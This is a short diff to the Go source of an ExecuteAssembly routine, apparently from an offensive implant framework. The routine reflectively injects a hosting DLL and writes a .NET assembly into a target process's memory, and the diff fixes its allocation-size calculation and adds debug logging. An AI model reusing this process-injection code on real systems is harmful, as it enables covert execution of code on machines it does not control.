@@ -222,9 +222,6 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	// {{if .Debug}}
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
 	// {{end}}
-	// Total size to allocate = assembly size + 1024 bytes for the args
-	totalSize := uint32(len(assembly) + 1024)
-	// Padd arguments with 0x00 -- there must be a cleaner way to do that
 
 	// 4 bytes Assembly Size
 	// 4 bytes Params Size
@@ -240,6 +237,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	payload = append(payload, []byte(params)...)
 	payload = append(payload, '\x00')
 	payload = append(payload, assembly...)
+	totalSize := uint32(len(payload))
 	assemblyAddr, err := allocAndWrite(payload, handle, totalSize)
 	if err != nil {
 		return "", err
@@ -395,6 +393,9 @@ func allocAndWrite(data []byte, handle windows.Handle, size uint32) (dataAddr ui
 	var nLength uintptr
 	err = syscalls.WriteProcessMemory(handle, dataAddr, &data[0], uintptr(uint32(len(data))), &nLength)
 	if err != nil {
+		//{{if .Debug}}
+		log.Printf("WriteProcessMemory failed: Wrote %d out of %d bytes\n", nLength, len(data))
+		//{{end}}
 		return
 	}
 	return
